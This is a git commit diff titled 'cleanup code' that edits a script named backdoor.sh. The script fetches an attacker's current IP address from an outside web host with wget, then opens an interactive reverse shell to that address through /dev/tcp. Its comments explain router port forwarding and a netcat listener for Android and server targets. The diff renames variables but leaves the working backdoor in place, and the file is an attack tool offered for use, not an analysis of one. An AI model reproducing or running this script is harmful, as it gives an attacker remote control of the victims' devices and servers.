eedbac4f19531e52769c3dc21b65a257bbb9dd64
Angel Diaz <angel.diaz@gmail.com>
2019-02-26 22:53:33 +0100

    cleanup code

--- backdoor.sh
+++ backdoor.sh
@@ -1,17 +1,16 @@
 #!/bin/bash
 
-# Define the port which will be open to receive the connection on the attacking IP
-port=8003
+# Define the port which will be open on the attacking IP to receive the connection
+attackerport=8003
 
 # Get the attacking current IP
-ip=$(wget -qO- http://eudomus.webfactional.com/currentip/)
-echo $ip >> currentip.log
+attackerip=$(wget -qO- http://eudomus.webfactional.com/currentip/)
 
-# Open a reverse tunnel
-bash -i >& /dev/tcp/$ip/$port 0>&1
+# Open a reverse tunnel to the attacker
+bash -i >& /dev/tcp/$attackerip/$attackerport 0>&1
 
 # INSTRUCTIONS:
-# 1. Open port 8001-8079 on your router and forward it to your device's local IP on the same port
+# 1. Open port 8001-8079 on the attacking router and forward it to your device's local IP on the same port
 # 2. Listen on your computer using NetCat running:
 #    nc -lvv 0.0.0.0 -p 8001 (Android)
 #    nc -nlvv -p 8002 (Server)
